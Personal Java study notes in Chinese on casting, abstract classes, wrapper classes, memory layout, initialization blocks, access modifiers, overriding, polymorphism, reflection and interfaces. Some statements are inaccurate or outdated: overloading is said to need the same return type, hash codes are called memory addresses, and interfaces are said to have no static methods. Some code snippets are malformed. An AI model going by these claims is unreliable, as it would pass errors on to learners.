    Employee e =k；//这样是向上造型，将子类对象转换为父类对象，这样可以实现多态，但是转换后的父类变量e并不能调用子类中独有的方法f（），只能调用父子类都有的方法。
	Manager m=（manager）e；//这样就是向下造型。类型强制转换。将向上造型获得的父类变量还原成他原来的类型。
	m.f（）;//这样可以通过向下造型获得的子类对象来调用子类独有的方法。`

但是这样的转换往往并不成功（这是因为这种向下造型只对于那些事通过向上造型获得的父类变量才有效，也就是说向下造型值能用于还原向上造型得到的父类变量，而不能转换任意的父类变量）。所以需要事先检查到底是都可以转换，也就是：
>
	if（e instanceof manager）
	{ 
		Manager m=（manager）e；
	}

一般来说，向下转换是很少使用的，使用的时候一般用于：父类对象要使用子类的方法的时候，这个强制转换的作用就是将已经被向上造型的类变量还原成他原来的类型。也就是说，以前由向上造型从manager变为employee，那么转换之后就不再能通过转换后的employee变量来调用manager独有的方法了（就是manager自己增加的方法），这个动态绑定导致只能通过父类变量调用父子都拥有的方法，而不能调用子类独有增加的方法。如果，转换后的这个父类变量想要使用子类自己独有的方法（注意，这个时候，这个父类变量是通过向上造型获得的，他实际上引用的是子类变量，只不过他不能使用子类独有的方法而已，只能使用父子类都有的方法），这个时候就可以通过这个向下造型将向上造型获得的父类变量转换为子类变量。然后通过这个子类变量来使用它独有的那些方法。
Java中需要将向下造型与类型判断(isinstanceof)一起结合。


Java中类型转换有这么几种：
自动类型转换：
基本数据类型之间的短空间向长空间的数据类型转换。
类之间的子类向父类的向上造型。
自动转换能否完成的决定因素是：被转换的数是否在转换目标的范围之内？
>
	double i =5；//5这个int在double的范围之内，所以可以自动转换。
	Byte b=5；//5这个int在byte的范围之内，所以可以自动转换。不同强制转换。

强制类型转换：
基本数据类型之间的长空间向短空间的数据类型转换。
类之间的父类想子类的向下造型（当然是用于恢复被向上转换的子类型）。

实际上出来基本数据和类之间的类型转换，还有一种就是表达式类型的自动提升。
所谓的表达式的类型：就是表达式中最高级的运算元素的类型。如int+double：结果就是double型。
>
	int a=5+5.5;//这样就是错误的，因为右边的表达式结果是double型，要转换成左边的int型就需要强制转换，而不能直接转换，精度会有损失所以是不能自动转换的。
如果需要使用，就需要将右边表达式结果进行强制转换：
>
	int a=(int)(5+5.5);

这样才是可以的，这样就是表达式类型的提升。

此处一个注意点：任何的表达式结果的类型都是其所有的运算因子最高的类型。即使运算结果是其他的类型，也必须是运算式中的最高级。
例如：int a=10/4;//这是正确的，因为10/4这个右边的表达式的结果是2，因为10与4都是int型，所以，10/4的结果也必须是int型，即使算术上结果是2.5，那也只能得到2这个int型。所以这个式子是没有问题的。
所以来说：一个表达式的结果的数据类型早已被它的运算元素决定了，而不在于实际的算术运算的结果。


Null不能赋值给基本类型变量，只能赋给引用变量。

强类型语言更加健壮。

Java中的抽象类
-----------------
C++中多态是通过抽象类实现的。而Java不是。
实际上Java中也有抽象成员函数。但是Java中的抽象类与抽象成员函数时用于继承的。也就是，抽象函数不用实现。留给子类进行实现。
 抽象方法充当占位的作用。
抽象类不能实例化。也就是不能创建一个抽象类对象。
但是可以创建一个抽象类变量，只是这个变量不能引用抽象类对象，可以引用非抽象类对象（如子类对象）。这也就是说抽象类变量可以作为一个多态接口。通过抽象类变量来调用具体的子类变量的方法。因为可以创建抽象类变量，只是不能创建抽象类对象而已。

只要有一个抽象方法的类就必须声明为抽象类。
没有一个抽象方法的类也可以声明为抽象类。

C++与Java中关键词对比：
Java中final=const；但是添加了不能继承的特性。
Java中static=static；全类共有的方法与变量。
Java中abstract=abstract；但是去掉了控制多态性的特性。

Java控制可见性：
Private：仅对本类可见。
Public：对所有类可见。
Protected：对本包和所有子类可见（这一点和C++不同）
默认：也就是不人工设置可见性，这个默认对本包可见。


Java中所有的类都是Object类的子类。所以，可以使用Object 类来引用所有的类对象（包括任何的数组）。这是向上造型。


Java中抽象类的作用，抽象关键词见Java中abstract关键字。
主要是一个设计模式相联系：模板模式。Java中共有23中设计模式。
当在一个类中某个方法暂时不能被实现时，可以留给子类进行实现。这时候，就需要在父类中将这个方法设为抽象方法，同时这个类也是抽象类。
这个时候，在子类中，要么将父类中全部抽象方法都给实现了，要么子类继续当一个抽象类（因为只要子类中有一个抽象方法，子类就必须是抽象类）。

抽象类不能创建对象，但是抽象类引用变量可以引用非抽象类对象实例。
>
	Abstract class A；
	Class B extends A；//B中重写了A中的抽象方法。
	A a=new B（）；//A是抽象类，不能创建实例。B不是抽象类。A的引用变量可以引用B类对象实例。

然后就可以使用a这个引用来调用B中重写的A的抽象方法，这就模板模式的工作原理。

Java的Object类中的常用方法
----------------------
Equal方法：
判断对象相等的方法，比较对象是否相等。
对于对象而言，使用“==”判等，只是判断对象的引用变量是否相等，而不是判断对象本身是否相等。
所以要重写equal方法来对对象判等。

注：使用==判断基本数据类型的时候，只会判断数据实际的大小，而不会比较数据的类型。
Eg：
int a=10；
double =10.0;
a==b;//对的。
　
HashCode方法：用于返回对象的散列码。
散列码是由一个对象导出的一个整数值，没有规律。对象不同，他们所对应的散列码（hashcode）也是不同的。这个散列码就是对象的内存地址。相等对象返回相同的散列码。
计算散列码的算法方法在Object类中，每一个子类计算对象散列码的算法都来自于此。

toString方法：用于返回对象的描述性字符串。
Object类中有toString方法，我们可以自己定义自己的toObject方法。
注意，equal、toString，hashCode这些方法都是从Object继承下来的类才有的。对于基本数据类型如、int这些是没有的。因为他们不是对象。只有对象才能使用这些方法。
toString方法是非常有用的调试方法。类库中许多类都拥有自己的toString方法。
Tostring方法有一个标准写法。程序员自己重写的用于调试。

Clone方法，用于复制一个新的对象，重新分配空间。创建对象的副本。

getClass，返回类的情况。
Getname，返回类的名称。
Getsuperclass，返回超类的情况。

Java中的包装类
-------------
由于java是面向对象语言，所以java中的一切都是对象。所有的类都是object类的子类。
但是历史遗留下来的8个基本数据类型是例外（他们是从C来的）。不能当成对象来使用。
因此java为这8个基本类型提供包装器，将他们包装成类。本质依旧是基本数据类型，只是被包装成类。 	

Java中存在一个对象包装器，当需要将一个基本数据类型转换为一个对象的时候，就需要使用对象包装器来将基本数据类型装换为一个对象。实际上所有的基本数据类型都存在一个对应的类。
例如：
某个arraylist中只能存储Interger这种对象，而不能存放基本数据类型，这时候就需要将int型数据包装成interger对象。
Interger i=new interger（2）；//这样就将一个基本数据包装成i这个interger对象。这称为自动打包。现在不需要这样人工手动进行包装了，JDK会自动进行包装。
可以直接：Integer i=2；即可。
但是打包成对象之后，会导致操作效率下降。

当将一个对象赋给一个基本数据类型的时候，会自动进行解包。
int a=i；//这样就将一个对象进行解包了。
相当于：int a=i.intvalue();//现在可以自动转换，不需要再使用函数进行人工转换了。
另外，在对对象进行增、减操作的时候，也会自动进行解包，增减操作之后再进行打包。
i++；//先解包，然后对里面的基本数据进行增减操作，然后再打包。

基本数据“==”判等的时候，是判断数据大小的。
数据包装器“==”判等的时候，是判断类变量所指向的内存位置是否相等。
那么在数据包装之后的类对象进行判等就需要使用equal方法进行。
打包和拆包是编译器的事，不是虚拟机的事。编译器在生成打包后的类的时候，会生成一些字节码，加入必要的方法调用。虚拟机只是执行这些字节码。
使用基本数据包装器的好处是：可以将一些需要使用的基本方法放在对象中，因为基本数据类型中是不能自己添加方法的。所以包装成对象之后，就可以添加自己想要的方法。
 例如：将一个数值字符串转换成基本数据类型。这样就可以在包装后的类中添加必要的方法以实现这一点。
包装器对象时不可变的，也就是说基本数据类型被包装之后，就不能够被修改了。这个对象里面的内容就固定了。

Java基本类型的包装类。
byte->Byte;
short->Short;
……

在JDK1.5之后，基本类型的数据值可以直接当成对象，被类型引用变量引用。因为JDK1.5之后提供了自动装箱、解包功能，将基本数据类型数据包装成对象（被当成它的包装类使用）。也可见对象当成它的基本数据类型使用。
Eg：
Object a=3；//3这个基本数据类型值直接被a这个引用变量引用。
Integer a=2；//这也是对的，会自动将2这个基本数据包装成Integer类型。

还会自动将包装类的对象解包成基本数据。这是没有问题的。
int b=a；//这样自动将a这个对象解包成int这个基本数据类型。

由于包装和解包极其方便，所以现在很少直接使用int、double这种基本数据类型。而是使用包装的类。因为包装类使用更加方便。

对于所有的基本类型包装类，在1.7之后，添加了一个新的方法static compare（）；
Eg：
compare（Double a，Double b）：

Java中的方法栈及内存模型
-------------
任何一个方法里面声明的变量，都是存放在这个方法的栈里面，有很多的栈，每个方法都有自己的栈。方法运行结束就会释放这块内存。栈内存只是一个临时内存。
基本数据类型变量和变量值都是放在方法的栈中。
引用类型变量也是放在方法的栈中，这个变量引用的对象是放在堆中的。每个Java虚拟机只有一个堆内存，一般默认是64M，但是可以在运行java程序的时候进行设置。只要JVM不退出，堆内存就一直存在。Java -Xms256：就是设置为256M。堆内存中的对象只能通过引用来访问。
例如：数组类型变量存放在栈中，数组这个对象本身时存放在堆中的。
Java中并没有真正意义上的数组。所谓的二维数组，只是若干数组引用变量构成的一个新的数组。

二维数组的特殊之处：内含的一维数组的首地址也就是一维数组的引用变量被存放在堆内存中。然后这个引用变量指向堆中的另一块空间中的数组。而不是如一维数组中的那样放在栈中，所以：一个引用并不一定是放在栈中，还有可能放在堆中。

Eg：二维数组的使用：
int[][] a=new int[4][];
a[0]=new int[]{1,2};//一维数组的引用。依次确定各维数组地址。a[0]就是一个引用变量。指向一个数组。
…… 
总之，N维数组的元素就是n-1维数组的引用变量。如此递归，一直向下引用。


操作数组的Arrays类，这是一个工具类，用于操作数组。
都是一些static方法，Arrays.search(a,5);//在数组a中查找一个数据5

数组引用变量被从栈中销毁之后，数组对象本身时不一定会立刻从堆中销毁（不会随着数组引用变量而回收）。
而是依靠GC（垃圾回收线程），来自动销毁堆内存中的对象。它的原理就是：GC会自动记录堆内存中对象是否有引用变量引用它。会在合适的时候回收该堆内存的位置。 

内存泄露：内存被占用，但是没有被收回，导致内存泄露。
还有一种情况：内存还需要继续被使用，就直接收回了这个内存。
这两种是编程中常见的内存问题。C语言中尤为常见。Java中概率小很多。
Java中引用实际上就是指针。只不顾对指针进行了包装，使其使用更为安全。

char ch =”0”;
int num=ch;//这样num就是48；是一个int，可以自动转换的。如果在数组中第0个元素对应为为“0”；那么转换的时候就是num-48，这样才行。

Java中对象的内存管理步骤：
在堆中开辟一块permenant空间，用于储存类的static部分。
创建对象引用变量，放在栈中。
创建引用的对象本身，这个对象放在堆中，对象自有的（不是类所有的）成员变量也放在这个对象中，就是在堆中。
调用方法时，方法中的局部变量放在栈中。

Java中类的原型
-----------------
一个类中最多有5个部分：

    修饰符 class 类名
    {
    　　//0-n个field定义；
    　　//0-n个方法定义；
    　　//0-n个构造器定义；
    　　//初始化块（static块）……
    　　//内部类、内部接口、枚举等。……
    }
如果多于5个即为错误的类。


Field定义：注：[]表示可以省略；
[修饰符]+类型+field名+[=默认值];
修饰符：public|protected|private, static，final。
类型：基本数据类型，数组，类（JDK中的类或者自定义类），接口，枚举。

方法定义：
[修饰符]+返回值类型+方法名(0-n个参数)
{
……
}
修饰符：public|protected|private, static，abstract|final。Abstract与final相反。
返回值：基本数据类型，数组，类（JDK中的类或者自定义类），接口，枚举，void。


构造器定义：
[修饰符]+构造器名（0-n个参数）
{
……
}
修饰符：public|protected|private;
构造器的作用：初始化类的实例，也就是初始化对象。

初始化块：
1、[static]
{
　　//可执行语句。
　　//类初始化块。专门用于初始化类拥有的成员变量，也就是static成员变量。
}

Eg：
`Public class A
{
　　static int age；
　　
　　Static
　　{
　　Age=10；//类初始化块。
　　}
}`


2、如果没有static，就是实例初始化块。
{
　　//可执行语句。
　　//实例初始化块。专门用于初始化实例拥有的成员变量，也就是非static成员变量。
}
Eg：
Public class A
{
　　int age；
　　{
　　Age=10；//实例初始化块。
　　}
}
　　
注：初始化块是自动调用的。不能被认为调用。

为什么要定义初始化块？
对于一个类而言，会有许多个构造器，这些构造器中互相有一些重复的初始化语句，这样就会加大代码量。所以，可以将这些重复的初始化语句放在一起，构成一个初始化块，让这些重复的初始化语句对于每一个对象或者类都自动执行。就可以减小代码量。这就是初始化语句的作用。
但是：只有处于构造器中前面的初始化语句才可以放在初始化块中，而不是跳跃式放入初始化语句。

Java中允许多个实例初始化块，但没有意义！


什么是实例初始化块的工作原理？
在编译中，所有的实例初始化块都会被还原到相应的构造器中，然后直接调用构造器即可。因此在汇编代码中并没有初始化块的痕迹。
同时，要注意的是：在声明成员变量时赋给的成员变量的值也是不会在汇编代码中留下痕迹的。也就是说，声明成员变量是赋给成员变量的初始值也会在汇编的时候直接插入到相应的构造函数中。

总之，初始化块中对成员变量赋值与成员变量声明时所赋的值都是一种假象（不包括static初始化块和static成员变量）。他们都是在编译的时候被直接插入到构造函数中（放在构造器的最前面。初始化块与成员变量赋值在构造器中具体哪一个放在前面决定于代码中哪一个放在前面，放在前面的在构造器中放在前面。），然后通过调用构造函数来进行起作用的。


类初始化块的工作原理？
类初始化块在类被加载的时候执行。对类拥有的field进行初始化。不会对所有的对象都执行，总共只执行一次。

static成员变量声明时赋值会在编译的时候插入到static初始化块中，然后执行static初始化块即可。插入位置与在代码中相对位置有关。这一点是不同于实例初始化块（实例成员变量和实例初始化块都一起插入到构造函数中）

那么初始化块代码在什么时候执行？
实例初始化块在每次调用构造器之前自动执行。而且实例初始化块与实例成员变量会在编译时直接插入到构造器中最前面，然后直接执行构造器即可。
类初始化块在类加载的时候就执行。而且类成员变量会被直接插入到类初始化块中，直接执行类初始化块即可。


Static:实际上并不是静态的意思。也不是公共的意思。而是一个标志，表明这个成员变量是属于这个类的。而不是属于某个对象。
在创建类对象之前，就将整个类加载到内存中，加载过程中，就将属于这个类自己的东西加载到堆中的某一个区域（叫做：permanent区）。也就是说，还没有分配对象的空间（构造器启动之前），就已经为static成员分配堆中的空间了。
总之：static修饰的属性、方法根本就不属于对象的，就是说，任何一个对象根本就没有这个static属性、方法。即使允许通过对象来访问static属性、方法。但是这只是一个语言设计上的错误、缺陷。实际上这个static属性、方法根本就不属于任何对象。只属于类。考试的时候常有这样的题目作陷阱。
　　
static方法也是属于这个类的。而不是属于某一个对象。也就是说，永远不要用某一个对象来调用static方法，因为对象根本就不永远这个static方法。

注：只要用到了一个类，那么就会初始化static部分，
Eg：person p；//这样就是用到了person这个类，就是加载了person这个类，该类拥有的成员变量就会进行初始化。
而且初始化是从顶层向下层的顺序进行的。

Java中所有的引用如果是被JVM初始化，那么全部被初始化为null；没有指向任何的有效内存区。
类属性、方法（static修饰）与实例属性、方法（非static修饰）是不一样的。

注意：永远都不要使用对象来调用Static修饰的类方法、类属性。如果别人的程序中有使用对象来调用static修饰的类方法、类属性时，首先就要把这个对象换成类。然后再继续看。
这种题目经常出现在面试考题中，所以要注意这个问题。一定要使用类来调用类方法、属性。而不是对象。

局部变量，既不属于类也不属于对象，所以永远不能用static修饰。

注：java方法中怎样传入多个参数？不知道有多少个。

    void f（int... Nums)
    {
    　　Nums[1]……；
    　　Nums[2]……；
    }//int后面加...,表明传入多个int。在方法中nums相当于一个数组引用。
参数个数可变的方法只能参数中可变的参数只能有一个。也就是说nums只能有这一个数组，而不能又有第二个多参数组。本质就是数组，实际上不怎么使用，不如直接传入一个数组引用。
　　
　　
`    Person p = new person();//注意：此中new才是创建对象，构造函数是对对象拥有的成员变量``进行初始化。二者功能是不同的。`

Java中this关键字
------------
this关键字用法：
this引用：在任何地方都可以使用this引用来调用非static方法。非static方法属于对象。
this调用：只能在构造函数第一行进行调用，用于调用本对象其他的构造函数。
在本类的方法中使用本对象的成员变量时，最好将this留下来。包括在构造函数中亦是如此。

this调用：使用this（）调用另外一个构造器。This()相当于一个构造器。
this引用：使用this.name;这是调用一个成员变量。

Java中递归
------------------

递归方法：
递归方法里面，实际上包含了一个隐式的循环。
递归方法就是再次调用自己，朝向已知的方向调用。

Java中重载
--------
方法的重载：
两同一不同：返回值相同，方法名相同。参数不同。
方法重载与返回值类型、是否static没有关系。
Java中访问权限
Private:当前类访问权限。
Protected:子类访问权限。
Public：公共访问权限。
没有设置访问权限：包访问权限。希望在同一个包中可以访问。
局部变量不能用这些修饰符修饰的原因：局部变量应该只在这个方法中有效，本来作用域就很想。所以就不需要使用修饰符限制使用范围了。

注：整个类是属于包的。也就是说类自己的修饰符可以省略。只能有一个类使用public修饰。就是主类。
如果这个类前加了public，那么在包内（package）和包外都可以访问。
如果用private等修饰，就没有意义了。
类名修饰符：public\final\abstract之一。

总之：
成员方法与变量的权限修饰符为：
Public：所有地方都可访问。
Private：本类内部可以访问，外部都不能访问。
Protected：本类内部和子类中可以访问，其他都不能访问。
未写：本包内可以访问，包外都不能访问。
所以，成员方法与变量的权限修饰符是public|protected|private|未写。

类的权限修饰符为：
Public：所有地方都可以使用这个类。
不能是Private：因为这个类不在其他类里面，所有设置为private之后，这个类就不能被使用了，因为private只能被本类内部使用。
不能是protected：因为这个类不在其他类里面，因为protected只能被子类所用，这个protected类不在另一个类中，所以他不能被另一个类的子类所使用。
未写：这个类可以被同一个包中的任何东西访问。
所以，类的权限修饰符只能是public或者未写。
Java中的包
包：命名空间的作用。将不同公司定义的同名类互相隔开。
所以，java中一个类的类名是：包名+类名。
定义包的语法：
Package 包1.包2.包3.……；

包名：用公司的域名的倒写。

要将一个类放在某一个包中需要：
在类的源代码中使用package指点放置目录路径。
生成的class文件必须放在package所声明的文件结构下面。可以手动建立package所声明的目录路径，然后将编译结果放进去。
还可以在编译的时候使用 javac -d . 源文件。这样-d选项可以自动创建package指明的目录路径，并将结果放在这个路径里面。也就是放在包里。

注意：在运行放在一个包中的class时，不再是java hi.  而应该加上包名：java hu.pi.hi。这样才行。
也就是说，运行包中的编译结果时，也必须将路径加上。而且当前目录必须在hu目录之外，不能进入包的路径中去运行class。必须在包的目录外运行（加上class的路径）。

总之，一旦为一个类加上了包名。那么这个类的名字就变为包名+类名。那么在任何时候使用这个类编译的class的时候，都必须使用包名+类名。如java命令运行这个class或者在其他源文件中import这个class的时候，均是如此。

使用这个类的时候，通过import包名来导入类。
还可以使用：import static java.lang.*;这就是JDK1.5后提供的静态导入。用于导入一个类中所有的static成员。

#Java中的方法重写
--------------------
方法重写：重写后的方法：两同、一大、一小。
方法名、参数列表相同。
访问权限更大或者相等。
返回值类型更小或者相同。子类抛出的异常要更小。

在重写方法前面加上：@override，可以在编译的时候，让编译器强制检查重写的方法有无错误。没有别的用处。
super：用于调用父类的方法或者某一个构造器。
注意：方法会有重写，但是成员变量没有重写（即使子类有父类中同名的成员变量，也依旧不是进行覆盖，而是子类中有了两个同名的该成员变量），也就是说不能在子类中覆盖父类中国的某个成员变量，而是必须在构造器中进行初始化。
在子类中无法区分到底是使用子类还是父类中的同名成员变量、方法。默认的是访问子类中的，也就是说默认是加上了this。那么如果要使用父类的成员变量、方法，可以使用super关键字。
在使用this或者super作构造器调用的时候，都必须放在构造器的第一行。而且this与super调用构造器是不能同时出现的。
如果没有人为调用父类的super或者this构造器构造器，机器会自动调用父类的无参构造器。
否则会人工调用对应的构造器。


关于重写：
父类中的public方法可以被子类重写。
父类中的private方法不能被子类重写。因为根本就无法访问，更不必说重写了。
父类中protected方法能被子类重写。
父类中为表明访问权限的方法不能被处于不同包中的子类重写。
Eg：

     class newer
	{
	int a=10;
	private void f()
	{
		System.out.println(10);
	}

	}

    class newTest extends newer
    {
	private void f()
	{
		System.out.println(100);
	}  //这是newTest自己新建的方法，而不是重写了newer类中已有的方法。即使他们是同名的方法。
	public static void main(String[] args)
	{
		newTest n = new newTest();
		n.f();
	}
	}




#Java中的多态
-------------
多态：可以使父类引用变量引用一个子类对象。使用的时候，依旧是使用父类引用变量来调用子类的方法。
所谓的态：行为、特征。
所谓的多态，就是同一个引用变量（如父类引用变量），在调用执行同一个方法的时候，表现出各种不同的行为特征。

多态实现的原因：
java中引用变量的类型有两种：
编译时类型：这就是写源代码时声明的引用变量类型。
运行时类型：决定于实际运行时这个引用变量所引用的对象。
如果，某引用变量的编译时类型与运行时类型不一致，就可能导致多态。
所以这样一来，两个编译是类型一样的引用变量，由于实际运行时类型不同，导致他们在调用相同的方法时，呈现不同的行为特征，这就是多态。
在编译的时候，编译器将父类引用变量视为父类变量。
在运行的时候，JVM将父类引用变量视为子类变量。

但是必须注意的是：多态针对的只是继承中那些在子类中已经重写的方法，而对于不是重写的方法，并不能体现多态的特性。也就是说，不能用父类引用变量来调用子类中新加入的方法。如果使用父类引用变量来调用子类中新加入的方法，就连编译都没办法通过。
因为：
在编译的时候，编译器将父类引用变量视为父类变量。
在运行的时候，JVM将父类引用变量视为子类变量。

#Java中引用类型的强制类型转换
-----------------
向下造型：也就是强制类型转换：
那么怎样让父类引用变量能够调用子类新加入的方法呢？
当一个父类引用变量引用了一个子类对象的时候，这就是所谓的向上造型。是自动进行的。

那么怎样让这样的一个父类引用变量调用子类新加入的方法？
就要采用向下造型。强制将父类引用变量转换为子类引用变量，这样就可以通过新的子类引用变量来调用子类新加入的方法了。
使用向下造型的前提是父类引用变量是通过子类对象向上造型而得来的。

强制转换的原理：
是使得原来的父类引用变量的编译时类型发生改变，变成了子类的引用类型。
而父类引用变量的运行时类型无需发生改变，因为原来的运行时类型就是子类类型。


强制类型转换的注意点：
基本数据类型中，除了boolean类型，其他类型都可以使用强制类型转换来实现大空间向小空间的转换。
引用类型中，只能在具有继承关系的两个类型间进行转换（父类引用变量转换为子类引用变量）。否则在编译的时候即会报错。而且将父类引用变量转换为子类引用变量之前，必须保证这个父类引用变量确实是引用一个子类对象才可以进行下面的转换。

`instanceof()`:用于判断前面的前面的引用变量是否引用后面类型的实例。
注意：使用这个函数时：要么前面的引用变量引用了后面类型的变量，要么二者有继承关系。否则编译时会报错。
Eg：
1

	Class A extends B；
	B b；
	b instanceof A；//false，二者具有继承关系。


Class A extends B；
B b；
b instanceof B；//true，b引用变量引用了后面的类型的实例。

	
Class A extends B；
B b；
b instanceof M；//会编译报错。因为b引用对象既不是M类实例，也与M类没有继承关系。

Java中常见异常
NullPointerException：空指针引用异常。
ArrayIndexOutOfBoundary：数组越界异常。
ClassCastException：类型转换异常：非引用子类对象的父类引用变量转换为子类引用变量发生异常。

#Java中编译类型
------------------
一个误区：
在继承中，如果子类新加入了一个与父类同名的成员变量，不会覆盖父类的成员变量，而是子类拥有了两个同名的成员变量。那么在通过子类或者父类引用变量来调用该名字的成员变量的时候，具体是调用了哪一个成员变量，决定于这个引用变量的编译是类型（到底是子类引用变量还是父类引用变量）。
示例如下：
>
	Class A
	{
 		int a=10；
	}
>
	Class B extends A
	{
 		int a=20；
	}//这样B类中有两个a成员变量，一个是10，一个是20.
>
那么，使用时，
>
	B b=new B();
	b.a;//这里输出的是20这一个成员变量，因为这里引用变量的编译时类型是B。
	A b=new B();//发生向上造型
    b.a;//这里输出的是10这一个成员变量，因为这里引用变量的编译是类型是A。
#Java中的Class类
--------
程序运行的时候，每一个类(如Person类)在加载的时候，JVM都会为这个类创建一个Class对象，这个Class对象里面记载的都是这个程序里面所有Person类对象的信息。同时我们可以通过Person类的Class对象获得这个Person类的所有情况，如：Person类里面的所有方法对象，Person类里面的所有Filed，Person类里面的所有构造方法对象。

#Java中的反射
----
反射：能够分析类能力的程序称为反射。对程序员没什么用处，只对工具设计者有用。

用于**动态获取类中的成员**：  
1. 可以获取一个类的`Class`  
2. 可以获取这个类的所有方法对象(注意：Java中一切都是对象，包括方法，一个类中的成员，即使连方法也是对象。) 可以通过这个方法对象来使这个方法被执行，将一个类对象作为方法对象的参数传入即可。  
3. 也可以获取这个类的所有Field对象。

反射的作用在于：  
当我们在使用一个已有的类的时候，在主代码的main()方法中使用别的已有的类的时候，如果被使用的类发生了改变，那么导致我们的main()方法中也要修改大量的代码，以适应被使用的类的修改。这个时候，如果在main()方法使用了反射(reflect)，那么就可以通过被使用的类的名字来获取这个被使用的类的所有情况(方法、Field等)，这样就不必修改我们的主程序了。只需在被使用类的配置文件中写上被使用类的名字，在mian()方法中通过读取这个配置文件获得这个被使用类的名字即可通过反射的方法使用这个类。即使修改了要使用的类的名字或者实现，所有的修改也只体现在这个类的配置文件中，将需要修改的地方减至最少，提升了类的可扩展性。

反射作用使用示例：

被使用类与使用类：
>
	import java.io.*;
	interface eatable
	{
		public void eat();
	}
>	
	class person implements eatable
	{	
		public void eat()
		{
			System.out.println("person EAT");
		}
	}
>	
	class animal implements eatable
	{	
		public void eat()
		{
			System.out.println("animal EAT");
		}
	}
>	
	public class ClassTest
	{
		public static void main(String[] args)throws Exception
		{
			BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File("file.txt")) ));
			Class className = Class.forName(br.readLine());
>			
			//使用了anima类
			eatable ea= (eatable)className.newInstance(); 
			ea.eat();
		}
	}
>
被使用类的配置文件：`file.txt`
>
	animal
各种框架里面大量使用了反射，但是只对用户暴露了类名与该类的配置文件，防止被修改。


#Java中的注解
----------------
例如：在重写一个方法的时候，在方法上面加上`@Override`，在编译阶段就保证编译成功。这就是注解(`Anotation`)的作用，这是和注释不一样的。  
`Anotation`是一个接口，`Override`之类的都是它的实现类。
获取注解对象只有一种方法：反射。







#Java中的接口
----------------
接口的功能非常丰富，因为接口往往是和设计模式结合使用的。
接口的概念：
可以认为接口是一种彻底的抽象。
是从多个相似的类中抽取出来的一种规范。可以认为接口是一种规范。
接口体现的是通信的规范。例如电脑主板上的插槽，就是因为这些插槽都遵循统一的通信规范，所以也称之为接口。


接口的定义：

	[修饰符] interface 接口名
	{
	　　0-n个field；
	　　0-n个抽象方法；
	　　0-n个内部类、内部接口、内部枚举定义；
	}
接口实现的只是一个规范，表示某一种功能（仅是表示一个功能而已），而不代表一个实体，是一个比抽象类更抽象的东西，只表示一个功能，任何implement这个接口的类都具有了这个功能。

接口不能有构造器，也不能有初始化块。
interface修饰符：public|未写。因为类的修饰符就是public或者未写。见：Java中访问权限。Final修饰符也不行，因为interface中存在抽象方法。也没有abstract修饰符。Interface比abstract更加抽象。
接口名有形容词。接口代表它可以做某一件事情（具有某一项功能）。
接口里面field的修饰符：public static final三个。默认的就已加上了这三个修饰符。自己不能进行修改了，要么不写，要么写这三者中的一部分。即使自己写了别的也就只是在这三者基础上加。 所以，field必须在定义的时候就赋与初值。因为有final、static修饰，所以必须由程序员来赋初值，但是没有初始化块，而且static变量不能在构造器中初始化。
接口里的方法修饰符：默认修饰符：public abstract，不能用static进行修饰，因为abstract不能与static同时修饰。也不能有final修饰符。同样不能进行修改。限定死了。所以方法必须没有方法体。也就是是说接口是个更抽象的东西，里面的方法必须没有方法体。都是抽象方法。
接口里的内部类、内部接口、内部枚举，默认修饰符：public static。不能修改。


注：为什么借口的field、方法、内部类等这些都是采用public进行修饰？
Answer：因为借口的作用就是让别人使用这个功能，所以必须对外开放，所以都有默认public。
总之，接口内部和接口本身的修饰都可以不写，而使用自己默认的。写不写效果一样。

一个类只能有1个父类。但是一个接口可以有n个父接口。

对于一个java文件而言，里面只能有一个public类，运行的时候，会自动装载这个public类，然后装载这个public类中的static成员（包括static成员方法与变量），装载static void main方法的时候，就会自动从这个main方法开始执行。所以，java成员能够运行的道理，从要运行文件中的唯一一个public类开始，从这个public类的static main方法开始执行。

同样，对于，一个java文件而言，只能有一个public interface。其余都是默认的为空。可以将接口理解为一种特殊的类。是一种彻底抽象的类。

接口的使用
接口可用于定义引用变量，但是不能用于创建实例（接口定义的引用变量可以引用它的子类对象，这时就相当于向上造型，当然，进行向上造型后获得的接口定义引用变量，可以对其进行强制类型转换，变为实现类的类型，然后调用实现类中的所有成员方法）。接口里面不能有main方法子类的，也就是说，接口里面的任何方法都必须借助实现了接口的类的对象来调用，而不能通过接口调用，因为接口极其抽象，无实体。接口里的方法不能是static。

接口最大的用处就是供其他类来实现：implements。就是使得这个类具有接口所代表的功能。注：一个类可以同时实现n个接口。可以弥补java单继承的不足，相当于模拟了多继承。当实现类中实现了接口之后，就会获得接口中所有的抽象方法。由于接口中所有的方法都是抽象的，所以实现类中要么为所有的这些抽象方法提供实现，要么这个实现类继续做抽象类。

接口主要是在面向接口编程的时候有用。

注意：类实现接口时，由于接口中的方法默认的权限是public，而implements的要求被实现后的方法的权限比原来接口中的方法权限更大，所以，在类中实现接口中的方法的时候，该方法的权限必须加上public，否则就是空，空权限小于public，不符合implements的要求。

注：在方法的调用中，编译时类型由引用变量类型决定，运行时类型是由引用变量引用的对象决定。在调用一个方法的时候，首先要保证编译能通过，那么就要保证这个被调用的方法是引用变量类型的成员方法（即使是抽象方法亦可）。
然后到了运行的时候，再根据引用变量所引用的对象类型来决定该引用哪一个成员方法（是父类的方法还是子类重写的方法？）。
接口与抽象类之间的共同点与区别
二者都可以保护抽象方法。
都不能创建实例。
子类继承抽象类、实现接口时，都要求实现所有的抽象方法，否则子类也只能是抽象类。
接口里面只能有抽象方法（默认即是如此），抽象类里面可以没有抽象方法。
接口里面没有静态方法（因为是默认abstract的，所以不能有static的）。但抽象类里面可以有静态方法。
接口里的field都是public static final；但抽象类中是普通的。
接口无初始化块，抽象类中可以有。
接口中无构造器，抽象类中可以有。
接口可以n个父接口，抽象类只能有一个父类。


Java中的内部类、内部接口、枚举
----------------------
枚举：一种实例数固定的特定类。
Eg：
性别这个类，只有两个实例。
行星这个类，只有八个实例。
这些类，不同于一般的类，他们的实例数只有已知的那么几个。

内部类：把一个类在另一个类里面进行定义。
所谓的内部类，就是表面外部这个类具有内部类这个东西。内部类不是表示外部类的某个属性的。而是表示外部类本身所具有的具体的零件，是具体实体的一部分。
例如：
牛具有一项属性：名字，那么bull这个类具有一个属性name，那么程序语言的表示上就是：has a的关系，也就是说bull类有一个field是String字符串。这是表示某个类的属性的表示方法，作为一个field表示。
但是如果是牛具有某一个零件，如，牛具有角，那么这个角对于牛这个类来说就不能如牛的名字哪样表示成一个内部拥有的属性了。而是应表示成牛这个类的内部属性。


